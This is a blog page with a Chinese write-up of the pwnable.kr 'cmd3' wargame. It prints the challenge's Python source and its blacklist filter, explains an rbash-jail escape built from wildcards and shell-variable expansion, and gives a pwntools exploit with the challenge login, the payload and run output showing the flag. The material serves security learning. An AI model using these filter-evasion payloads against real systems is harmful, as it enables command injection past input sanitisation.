@@ -1,0 +1,834 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=6.3.0" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.3.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.3.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.3.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.3.0" color="#222">
+
+
+
+
+
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '6.3.0',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="前言这是cmd2的升级版，题目做了很多限制，我也是花了好长时间才想出来。 分析题目给出了cmd3.py的源码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556#!/usr/bin/pythonimport base64, random, mat">
+<meta name="keywords" content="pwnable.kr,PWN">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pwnable.kr-cmd3">
+<meta property="og:url" content="http://yoursite.com/2018/07/11/pwnable.kr-cmd3/index.html">
+<meta property="og:site_name" content="R00tnb&#39;s Blog">
+<meta property="og:description" content="前言这是cmd2的升级版，题目做了很多限制，我也是花了好长时间才想出来。 分析题目给出了cmd3.py的源码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556#!/usr/bin/pythonimport base64, random, mat">
+<meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2018-08-04T07:10:57.857Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="pwnable.kr-cmd3">
+<meta name="twitter:description" content="前言这是cmd2的升级版，题目做了很多限制，我也是花了好长时间才想出来。 分析题目给出了cmd3.py的源码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556#!/usr/bin/pythonimport base64, random, mat">
+
+
+
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/07/11/pwnable.kr-cmd3/"/>
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>pwnable.kr-cmd3 | R00tnb's Blog</title>
+  
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">R00tnb's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+    <a href="/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-home"></i> <br />Startseite</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+    <a href="/about/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-user"></i> <br />Über</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+    <a href="/tags/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />Tags</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+    <a href="/categories/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-th"></i> <br />Kategorien</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+    <a href="/archives/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />Archiv</a>
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/07/11/pwnable.kr-cmd3/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="r00tnb">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="R00tnb's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">pwnable.kr-cmd3
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Veröffentlicht am</span>
+              
+
+              
+                
+              
+
+              <time title="Post created: 2018-07-11 12:18:00" itemprop="dateCreated datePublished" datetime="2018-07-11T12:18:00+08:00">2018-07-11</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Edited on</span>
+                
+                <time title="Updated at: 2018-08-04 15:10:57" itemprop="dateModified" datetime="2018-08-04T15:10:57+08:00">2018-08-04</time>
+              
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">in</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这是<code>cmd2</code>的升级版，题目做了很多限制，我也是花了好长时间才想出来。</p>
+<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>题目给出了<code>cmd3.py</code>的源码<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> base64, random, math</span><br><span class="line"><span class="keyword">import</span> os, sys, time, string</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Timer</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rstring</span><span class="params">(N)</span>:</span></span><br><span class="line">	<span class="keyword">return</span> <span class="string">''</span>.join(random.choice(string.ascii_uppercase + string.digits) <span class="keyword">for</span> _ <span class="keyword">in</span> range(N))</span><br><span class="line"></span><br><span class="line">password = rstring(<span class="number">32</span>)</span><br><span class="line">filename = rstring(<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">TIME = <span class="number">60</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyTimer</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">global</span> filename</span><br><span class="line">        timer=<span class="keyword">None</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">                self.timer = Timer(TIME, self.dispatch, args=[])</span><br><span class="line">                self.timer.start()</span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">dispatch</span><span class="params">(self)</span>:</span></span><br><span class="line">                <span class="keyword">print</span> <span class="string">'time expired! bye!'</span></span><br><span class="line">		sys.stdout.flush()</span><br><span class="line">		os.system(<span class="string">'rm flagbox/'</span>+filename)</span><br><span class="line">                os._exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">filter</span><span class="params">(cmd)</span>:</span></span><br><span class="line">	blacklist = <span class="string">'` !&amp;|"\'*'</span></span><br><span class="line">	<span class="keyword">for</span> c <span class="keyword">in</span> cmd:</span><br><span class="line">		<span class="keyword">if</span> ord(c)&gt;<span class="number">0x7f</span> <span class="keyword">or</span> ord(c)&lt;<span class="number">0x20</span>: <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">		<span class="keyword">if</span> c.isalnum(): <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">		<span class="keyword">if</span> c <span class="keyword">in</span> blacklist: <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">	MyTimer()</span><br><span class="line">	<span class="keyword">print</span> <span class="string">'your password is in flagbox/&#123;0&#125;'</span>.format(filename)</span><br><span class="line">	os.system(<span class="string">"ls -al"</span>)</span><br><span class="line">	os.system(<span class="string">"ls -al jail"</span>)</span><br><span class="line">	open(<span class="string">'flagbox/'</span>+filename, <span class="string">'w'</span>).write(password)</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		<span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">			sys.stdout.write(<span class="string">'cmd3$ '</span>)</span><br><span class="line">			sys.stdout.flush()</span><br><span class="line">			cmd = raw_input()</span><br><span class="line">			<span class="keyword">if</span> cmd==password:</span><br><span class="line">				os.system(<span class="string">'./flagbox/print_flag'</span>)</span><br><span class="line">				<span class="keyword">raise</span> <span class="number">1</span></span><br><span class="line">			<span class="keyword">if</span> filter(cmd) <span class="keyword">is</span> <span class="keyword">False</span>:</span><br><span class="line">				<span class="keyword">print</span> <span class="string">'caught by filter!'</span></span><br><span class="line">				sys.stdout.flush()</span><br><span class="line">				<span class="keyword">raise</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line">			os.system(<span class="string">'echo "&#123;0&#125;" | base64 -d - | env -i PATH=jail /bin/rbash'</span>.format(cmd.encode(<span class="string">'base64'</span>)))</span><br><span class="line">			sys.stdout.flush()</span><br><span class="line">	<span class="keyword">except</span>:</span><br><span class="line">		os.system(<span class="string">'rm flagbox/'</span>+filename)</span><br><span class="line">		os._exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure></p>
+<p>从源码中可以看出一下限制：</p>
+<ul>
+<li>程序使用了一个过滤函数<code>filter</code>。该函数不允许输入中带有<code>0-9a-zA-Z</code>和<code></code> !&amp;|”\’*`的字符，并且输入必须在可打印字符的范围内。</li>
+<li>通过过滤函数的检查后，输入会被<code>base64</code>编码再传入<code>os.system</code>函数执行命令。所以这里也无法命令注入。</li>
+<li>程序使用<code>env</code>命令重写了<code>PATH</code>变量开启了新的命令执行环境，并且使用<code>/bin/rbash</code>（受限制shell）来执行输入的命令。<br>题目需要绕过这些限制并读取到<code>password</code>然后提交即可getfalg。<br>先执行一下程序（注意先阅读readme）<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">cmd3@ubuntu:~$ nc 0 9023</span><br><span class="line">total 5268</span><br><span class="line">drwxr-x---  5 root cmd3_pwn    4096 Mar 15  2016 .</span><br><span class="line">drwxr-xr-x 87 root root        4096 Dec 27  2017 ..</span><br><span class="line">d---------  2 root root        4096 Jan 22  2016 .bash_history</span><br><span class="line">-rwxr-x---  1 root cmd3_pwn    1421 Mar 11  2016 cmd3.py</span><br><span class="line">drwx-wx---  2 root cmd3_pwn   24576 Jul 10 20:07 flagbox</span><br><span class="line">drwxr-x---  2 root cmd3_pwn    4096 Jan 22  2016 jail</span><br><span class="line">-rw-r--r--  1 root root     5345137 Jul 10 20:09 log</span><br><span class="line">-rw-r-----  1 root root         764 Mar 10  2016 super.pl</span><br><span class="line">total 8</span><br><span class="line">drwxr-x--- 2 root cmd3_pwn 4096 Jan 22  2016 .</span><br><span class="line">drwxr-x--- 5 root cmd3_pwn 4096 Mar 15  2016 ..</span><br><span class="line">lrwxrwxrwx 1 root root        8 Jan 22  2016 cat -&gt; /bin/cat</span><br><span class="line">lrwxrwxrwx 1 root root       11 Jan 22  2016 id -&gt; /usr/bin/id</span><br><span class="line">lrwxrwxrwx 1 root root        7 Jan 22  2016 ls -&gt; /bin/ls</span><br><span class="line">your password is in flagbox/KG3TSCVOPHSPINJD1N3MOD3T637CLX5L</span><br><span class="line">cmd3$</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>可以看到我们只能执行<code>jail</code>目录下的三个程序，其他程序由于需要跨目录执行，必须使用<code>/</code>符号，然而在<code>/bin/rbash</code>中是不允许命令中带有<code>/</code>符号的（关于受限制shell可以参考<a href="https://www.howtoing.com/rbash-a-restricted-bash-shell-explained-with-practical-examples/" target="_blank" rel="noopener">rbash - 一个受限的Bash Shell用实际示例说明</a>）。对于该题目来说只需要执行<code>cat flagbox/KG3TSCVOPHSPINJD1N3MOD3T637CLX5L</code>获得password即可。但是要执行该命令需要考虑绕过空格和字母数字，因为这些字符无法通过<code>filter</code>函数。接下来只要绕过这些即可。</p>
+<ol>
+<li>绕过空格。对于<code>cat</code>命令，可以使用<code>&lt;</code>符号来代替空格。也可使用其他方法，参考<a href="https://www.cnblogs.com/sevck/p/6072721.html" target="_blank" rel="noopener">linux下不用空格执行带参数的5种姿势</a>。</li>
+<li>绕过字符数字。要想绕过最常用最重要的字母数字，必须借用已经有的字母数字。在linux下有很多通配符可以用来指代某些文件，<code>*</code>符号被过滤了可以使用<code>?</code>（表示该位置必有一个字符）来指代。例如，要指代<code>jail/cat</code>可以输入<code>????/???</code>即可。当然，如果出现了指代多个文件或目录的情况它一般指代<code>ls</code>命令排序后的第一个。但是，对于受限制shell来说使用上面指代的话还是会出现<code>/</code>符号导致无法执行，我们必须执行<code>cat</code>而不是用路径指代它。这时，需要了解<code>$_</code>变量，该变量在shell中指代上次执行的命令，这样我们可以先使用上面的方式执行一遍，然后操作<code>$_</code>变量获取它的子串<code>cat</code>即可。可以输入<code>????/???;${__=${_#?????}};</code>来将<code>cat</code>保存在<code>$___</code>变量中。对于linux下的环境变量的操作可以参考<a href="https://blog.csdn.net/number_0_0/article/details/73291182" target="_blank" rel="noopener">https://blog.csdn.net/number_0_0/article/details/73291182</a>。要解决<code>flagbox/KG3TSCVOPHSPINJD1N3MOD3T637CLX5L</code>这样的长字符串，可以利用<code>cat</code>命令来从<code>/tmp/</code>（任何用户可读写）目录下的文件读取。例如，将长字符串写入<code>/tmp/__/1</code>中，然后执行<code>$(cat&lt;/???/__/?)</code>这样<code>$_</code>变量就存有长字符串了。<br>下面是exp<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s = ssh(port=<span class="number">2222</span>,user=<span class="string">"cmd3"</span>,host=<span class="string">"pwnable.kr"</span>,password=<span class="string">"FuN_w1th_5h3ll_v4riabl3s_haha"</span>)</span><br><span class="line">poc = <span class="string">"????/???;$&#123;__=$&#123;_#?????&#125;&#125;;$($__&lt;/???/__/?);$&#123;___=$_&#125;;$__&lt;$___"</span></span><br><span class="line"></span><br><span class="line">r = s.run(<span class="string">"nc 0 9023"</span>)</span><br><span class="line">r.recvuntil(<span class="string">"your password is in "</span>)</span><br><span class="line">data = r.recvline().rstrip() <span class="comment">#get flagbox/......</span></span><br><span class="line">s.run(<span class="string">"mkdir /tmp/__"</span>)</span><br><span class="line">s.run(<span class="string">'echo "&#123;0&#125;" &gt;/tmp/__/1'</span>.format(data))</span><br><span class="line">r.recvuntil(<span class="string">"cmd3$ "</span>)</span><br><span class="line">r.sendline(poc)</span><br><span class="line">tmp = r.recvuntil(<span class="string">"cmd3$ "</span>)</span><br><span class="line">pwd = tmp[<span class="number">-38</span>:<span class="number">-6</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">'Get pwd: &#123;0&#125;'</span>.format(pwd)</span><br><span class="line">r.sendline(pwd)</span><br><span class="line"><span class="keyword">print</span> r.recvall()</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop# python poc.py</span><br><span class="line">[+] Connecting to pwnable.kr on port 2222: Done</span><br><span class="line">[!] Couldn&apos;t check security settings on &apos;pwnable.kr&apos;</span><br><span class="line">[+] Opening new channel: &apos;nc 0 9023&apos;: Done</span><br><span class="line">[+] Opening new channel: &apos;mkdir /tmp/__&apos;: Done</span><br><span class="line">[+] Opening new channel: &apos;echo &quot;flagbox/9E36W2ZIM8Y0I4GWLPMKPE1GAQPGCMFO&quot; &gt;/tmp/__/1&apos;: Done</span><br><span class="line">Get pwd: 5AE535O9P84VCXKWS1PYYRRT8JLD3JQN</span><br><span class="line">[+] Receiving all data: Done (54B)</span><br><span class="line">[*] Closed SSH channel with pwnable.kr</span><br><span class="line">Congratz! here is flag : D4ddy_c4n_n3v3r_St0p_m3_haha</span><br><span class="line"></span><br><span class="line">[*] Closed SSH channel with pwnable.kr</span><br><span class="line">[*] Closed SSH channel with pwnable.kr</span><br></pre></td></tr></table></figure>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这道题目很有意思，主要使用linux下shell的知识，又学到了不少。</p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/pwnable-kr/" rel="tag"># pwnable.kr</a>
+          
+            <a href="/tags/PWN/" rel="tag"># PWN</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/04/24/pwnable.kr-crypto1/" rel="next" title="pwnable.kr-crypto1">
+                <i class="fa fa-chevron-left"></i> pwnable.kr-crypto1
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/07/16/pwnable.kr-wtf/" rel="prev" title="pwnable.kr-wtf">
+                pwnable.kr-wtf <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Inhaltsverzeichnis
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Übersicht
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">r00tnb</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">44</span>
+                    <span class="site-state-item-name">Artikel</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  <a href="/categories/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">4</span>
+                    <span class="site-state-item-name">Kategorien</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">7</span>
+                    <span class="site-state-item-name">Tags</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#分析"><span class="nav-number">2.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#总结"><span class="nav-number">3.</span> <span class="nav-text">总结</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">r00tnb</span>
+
+  
+
+  
+</div>
+
+
+
+
+  <div class="powered-by">Erstellt mit  <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> v3.7.1</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme – <a class="theme-link" target="_blank" href="https://theme-next.org">NexT.Gemini</a> v6.3.0</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+	
+    
+
+    
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=6.3.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=6.3.0"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=6.3.0"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=6.3.0"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.3.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.3.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.3.0"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
